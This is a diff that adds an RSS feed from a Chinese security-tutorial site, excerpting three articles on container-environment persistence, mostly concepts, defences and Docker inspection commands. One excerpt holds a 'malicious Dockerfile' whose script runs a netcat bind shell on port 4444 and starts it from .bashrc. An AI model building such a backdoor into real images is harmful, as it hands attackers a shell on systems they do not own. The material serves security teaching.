@@ -1,0 +1,235 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>容器环境持久化 on Linux邪修</title><link>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96/</link><description>Recent content in 容器环境持久化 on Linux邪修</description><generator>Hugo</generator><language>zh</language><copyright>© 2024 Linux邪修</copyright><atom:link href="https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96/index.xml" rel="self" type="application/rss+xml"/><item><title>容器环境持久化基础知识</title><link>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</guid><description>&lt;h2 id="技术介绍"&gt;技术介绍&lt;a class="anchor" href="#%e6%8a%80%e6%9c%af%e4%bb%8b%e7%bb%8d"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;容器环境持久化是一种利用容器环境的特性进行持久化攻击的技术。攻击者通过在容器环境中创建持久化机制，在容器重启或重新部署后仍然保持对容器资源的访问。本教程将详细介绍容器环境持久化的基础知识、核心概念和技术方法，帮助安全人员理解和防御容器环境持久化攻击。&lt;/p&gt;
+&lt;h3 id="容器环境持久化核心概念"&gt;容器环境持久化核心概念&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e6%a0%b8%e5%bf%83%e6%a6%82%e5%bf%b5"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;容器（Container）&lt;/strong&gt;：轻量级的虚拟化技术&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器环境持久化（Container Environment Persistence）&lt;/strong&gt;：利用容器环境进行持久化攻击的技术&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Docker&lt;/strong&gt;：流行的容器平台&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Kubernetes&lt;/strong&gt;：容器编排平台&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器镜像（Container Image）&lt;/strong&gt;：容器的镜像文件&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器卷（Container Volume）&lt;/strong&gt;：容器的存储卷&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器网络（Container Network）&lt;/strong&gt;：容器的网络配置&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器编排（Container Orchestration）&lt;/strong&gt;：容器的编排和管理&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器安全（Container Security）&lt;/strong&gt;：容器的安全防护&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器逃逸（Container Escape）&lt;/strong&gt;：从容器逃逸到宿主机的攻击&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器Rootkit&lt;/strong&gt;：容器中的Rootkit&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;持久化（Persistence）&lt;/strong&gt;：在系统中保持长期访问的技术&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="容器环境持久化的特点"&gt;容器环境持久化的特点&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e7%9a%84%e7%89%b9%e7%82%b9"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;隐蔽性&lt;/strong&gt;：容器环境持久化攻击隐蔽性强&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;持久性&lt;/strong&gt;：容器环境持久化可以实现持久化访问&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;灵活性&lt;/strong&gt;：容器环境持久化技术灵活多样&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;依赖性&lt;/strong&gt;：容器环境持久化依赖容器环境&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;检测难度&lt;/strong&gt;：容器环境持久化检测难度较大&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;影响范围&lt;/strong&gt;：容器环境持久化影响范围广&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="容器环境持久化的重要性"&gt;容器环境持久化的重要性&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e7%9a%84%e9%87%8d%e8%a6%81%e6%80%a7"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;攻击检测&lt;/strong&gt;：检测容器环境持久化攻击&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;环境加固&lt;/strong&gt;：加固容器环境防止容器环境持久化&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;安全防护&lt;/strong&gt;：防护容器环境持久化攻击&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;合规性&lt;/strong&gt;：满足合规性要求&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;风险降低&lt;/strong&gt;：降低安全风险&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;业务保护&lt;/strong&gt;：保护业务连续性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="技术体系"&gt;技术体系&lt;a class="anchor" href="#%e6%8a%80%e6%9c%af%e4%bd%93%e7%b3%bb"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;容器环境持久化技术体系主要包括以下几个方面：&lt;/p&gt;
+&lt;h3 id="容器环境持久化原理"&gt;容器环境持久化原理&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e5%8e%9f%e7%90%86"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;容器架构&lt;/strong&gt;：容器的架构和组件&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器生命周期&lt;/strong&gt;：容器的生命周期&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器网络&lt;/strong&gt;：容器的网络配置&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器存储&lt;/strong&gt;：容器的存储配置&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器安全&lt;/strong&gt;：容器的安全机制&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="容器环境持久化技术"&gt;容器环境持久化技术&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e6%8a%80%e6%9c%af"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;容器镜像持久化&lt;/strong&gt;：通过容器镜像实现持久化&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器卷持久化&lt;/strong&gt;：通过容器卷实现持久化&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器网络持久化&lt;/strong&gt;：通过容器网络实现持久化&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器编排持久化&lt;/strong&gt;：通过容器编排实现持久化&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器逃逸持久化&lt;/strong&gt;：通过容器逃逸实现持久化&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="容器环境持久化防御"&gt;容器环境持久化防御&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e9%98%b2%e5%be%a1"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;容器镜像扫描&lt;/strong&gt;：扫描容器镜像漏洞&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器运行时保护&lt;/strong&gt;：保护容器运行时&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器网络隔离&lt;/strong&gt;：隔离容器网络&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器存储加密&lt;/strong&gt;：加密容器存储&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器监控&lt;/strong&gt;：监控容器活动&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="工具使用"&gt;工具使用&lt;a class="anchor" href="#%e5%b7%a5%e5%85%b7%e4%bd%bf%e7%94%a8"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id="容器环境持久化检测工具"&gt;容器环境持久化检测工具&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e6%a3%80%e6%b5%8b%e5%b7%a5%e5%85%b7"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Docker命令&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：Docker命令行工具&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;用途&lt;/strong&gt;：管理Docker容器&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;使用方法&lt;/strong&gt;：
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 列出所有容器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker ps -a
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 查看容器详情&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker inspect container_id
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 查看容器日志&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker logs container_id
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 查看容器进程&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker top container_id
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 查看容器网络&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker network ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker network inspect network_id&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Kubernetes命令&lt;/strong&gt;：&lt;/p&gt;</description></item><item><title>容器环境持久化技术</title><link>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96%E6%8A%80%E6%9C%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96%E6%8A%80%E6%9C%AF/</guid><description>&lt;h1 id="容器环境持久化技术"&gt;容器环境持久化技术&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e6%8a%80%e6%9c%af"&gt;#&lt;/a&gt;&lt;/h1&gt;
+&lt;h2 id="技术介绍"&gt;技术介绍&lt;a class="anchor" href="#%e6%8a%80%e6%9c%af%e4%bb%8b%e7%bb%8d"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;容器环境持久化是指在容器化环境中建立长期存在的访问机制，使攻击者能够在容器重启、更新或被终止后仍然保持对环境的访问能力。随着容器技术的广泛应用，容器环境持久化已成为红队攻击和蓝队防御的重要技术领域。&lt;/p&gt;
+&lt;h3 id="主要持久化技术"&gt;主要持久化技术&lt;a class="anchor" href="#%e4%b8%bb%e8%a6%81%e6%8c%81%e4%b9%85%e5%8c%96%e6%8a%80%e6%9c%af"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;容器镜像后门植入&lt;/li&gt;
+&lt;li&gt;容器启动命令劫持&lt;/li&gt;
+&lt;li&gt;容器卷挂载利用&lt;/li&gt;
+&lt;li&gt;容器网络持久化&lt;/li&gt;
+&lt;li&gt;容器编排系统利用&lt;/li&gt;
+&lt;li&gt;容器特权提升持久化&lt;/li&gt;
+&lt;li&gt;容器配置文件篡改&lt;/li&gt;
+&lt;li&gt;容器运行时注入&lt;/li&gt;
+&lt;li&gt;容器镜像仓库污染&lt;/li&gt;
+&lt;li&gt;容器API滥用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="适用场景"&gt;适用场景&lt;a class="anchor" href="#%e9%80%82%e7%94%a8%e5%9c%ba%e6%99%af"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;红队攻击和渗透测试&lt;/li&gt;
+&lt;li&gt;容器安全评估&lt;/li&gt;
+&lt;li&gt;容器环境安全研究&lt;/li&gt;
+&lt;li&gt;云原生安全测试&lt;/li&gt;
+&lt;li&gt;容器平台安全审计&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="入门级使用"&gt;入门级使用&lt;a class="anchor" href="#%e5%85%a5%e9%97%a8%e7%ba%a7%e4%bd%bf%e7%94%a8"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id="容器镜像后门植入"&gt;容器镜像后门植入&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e9%95%9c%e5%83%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;在容器镜像中植入后门，实现持久化访问：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 创建恶意Dockerfile&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;FROM ubuntu:20.04
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 安装后门&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RUN apt-get update &lt;span style="color:#ff6ac1"&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get install -y netcat
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 添加后门脚本&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RUN &lt;span style="color:#ff5c57"&gt;echo&lt;/span&gt; &lt;span style="color:#5af78e"&gt;&amp;#39;#!/bin/bash&amp;#39;&lt;/span&gt; &amp;gt; /root/backdoor.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RUN &lt;span style="color:#ff5c57"&gt;echo&lt;/span&gt; &lt;span style="color:#5af78e"&gt;&amp;#39;while true; do&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /root/backdoor.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RUN &lt;span style="color:#ff5c57"&gt;echo&lt;/span&gt; &lt;span style="color:#5af78e"&gt;&amp;#39; nc -lvp 4444 -e /bin/bash &amp;amp;&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /root/backdoor.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RUN &lt;span style="color:#ff5c57"&gt;echo&lt;/span&gt; &lt;span style="color:#5af78e"&gt;&amp;#39; sleep 60&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /root/backdoor.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RUN &lt;span style="color:#ff5c57"&gt;echo&lt;/span&gt; &lt;span style="color:#5af78e"&gt;&amp;#39;done&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /root/backdoor.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RUN chmod +x /root/backdoor.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 设置后门自动启动&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RUN &lt;span style="color:#ff5c57"&gt;echo&lt;/span&gt; &lt;span style="color:#5af78e"&gt;&amp;#39;/root/backdoor.sh&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /root/.bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;CMD &lt;span style="color:#ff6ac1"&gt;[&lt;/span&gt;&lt;span style="color:#5af78e"&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span style="color:#ff6ac1"&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="容器启动命令劫持"&gt;容器启动命令劫持&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e5%90%af%e5%8a%a8%e5%91%bd%e4%bb%a4%e5%8a%ab%e6%8c%81"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;劫持容器启动命令，植入恶意代码：&lt;/p&gt;</description></item><item><title>容器环境持久化技术详解</title><link>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96/%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E6%8C%81%E4%B9%85%E5%8C%96%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3/</guid><description>&lt;h1 id="容器环境持久化技术详解"&gt;容器环境持久化技术详解&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e6%8a%80%e6%9c%af%e8%af%a6%e8%a7%a3"&gt;#&lt;/a&gt;&lt;/h1&gt;
+&lt;h2 id="技术介绍"&gt;技术介绍&lt;a class="anchor" href="#%e6%8a%80%e6%9c%af%e4%bb%8b%e7%bb%8d"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;容器环境持久化是一种针对容器化环境的持久化技术，攻击者通过利用容器的特性和配置，实现对容器环境的长期访问和控制。这种技术利用了容器的轻量级、可移植性和快速部署的特点，具有隐蔽性强、影响范围广和难以检测等特点。本教程将详细介绍容器环境持久化的核心概念、技术方法、防御措施和案例分析，帮助安全人员理解和防御这种持久化攻击。&lt;/p&gt;
+&lt;h3 id="容器环境持久化核心概念"&gt;容器环境持久化核心概念&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e6%a0%b8%e5%bf%83%e6%a6%82%e5%bf%b5"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;容器&lt;/strong&gt;：一种轻量级的虚拟化技术，用于打包和运行应用程序及其依赖&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器镜像&lt;/strong&gt;：容器的模板，包含应用程序及其依赖&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器运行时&lt;/strong&gt;：执行容器的软件，如Docker、containerd、CRI-O&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器编排&lt;/strong&gt;：管理多个容器的工具，如Kubernetes、Docker Swarm&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;持久化&lt;/strong&gt;：使攻击者在容器环境中保持长期访问权限的技术&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器卷&lt;/strong&gt;：用于在容器和主机之间共享数据的存储机制&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;环境变量&lt;/strong&gt;：容器运行时的配置参数&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限提升&lt;/strong&gt;：通过容器获取更高的系统权限&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;横向移动&lt;/strong&gt;：在容器环境中从一个容器移动到另一个容器&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;防御规避&lt;/strong&gt;：通过各种技术，逃避容器安全工具的检测&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="容器环境持久化技术体系"&gt;容器环境持久化技术体系&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e6%8a%80%e6%9c%af%e4%bd%93%e7%b3%bb"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;容器镜像持久化&lt;/strong&gt;：在容器镜像中嵌入恶意代码，实现持久化&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器卷持久化&lt;/strong&gt;：在容器卷中存储恶意代码和配置，实现持久化&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;环境变量持久化&lt;/strong&gt;：通过环境变量注入恶意代码，实现持久化&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器运行时持久化&lt;/strong&gt;：修改容器运行时配置，实现持久化&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器编排持久化&lt;/strong&gt;：修改容器编排配置，实现持久化&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;主机持久化&lt;/strong&gt;：通过容器逃逸，在主机上实现持久化&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="容器环境持久化防御技术"&gt;容器环境持久化防御技术&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e9%98%b2%e5%be%a1%e6%8a%80%e6%9c%af"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;容器镜像扫描&lt;/strong&gt;：扫描容器镜像中的恶意代码和漏洞&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器运行时监控&lt;/strong&gt;：监控容器运行时的活动&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器卷监控&lt;/strong&gt;：监控容器卷的访问和修改&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器编排安全&lt;/strong&gt;：确保容器编排配置的安全&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器隔离&lt;/strong&gt;：加强容器的隔离性，防止容器逃逸&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;主机安全&lt;/strong&gt;：加强主机的安全，防止通过容器逃逸实现持久化&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;日志分析&lt;/strong&gt;：分析容器环境的日志，检测异常活动&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="入门级使用"&gt;入门级使用&lt;a class="anchor" href="#%e5%85%a5%e9%97%a8%e7%ba%a7%e4%bd%bf%e7%94%a8"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id="容器环境基础"&gt;容器环境基础&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e5%9f%ba%e7%a1%80"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;了解容器环境的基本概念和操作：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 1. 容器技术&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# Docker：最流行的容器平台&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# Kubernetes：容器编排平台&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# containerd：容器运行时&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# CRI-O：专为Kubernetes设计的容器运行时&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 2. Docker基础操作&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 安装Docker&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 查看Docker版本&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker --version
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
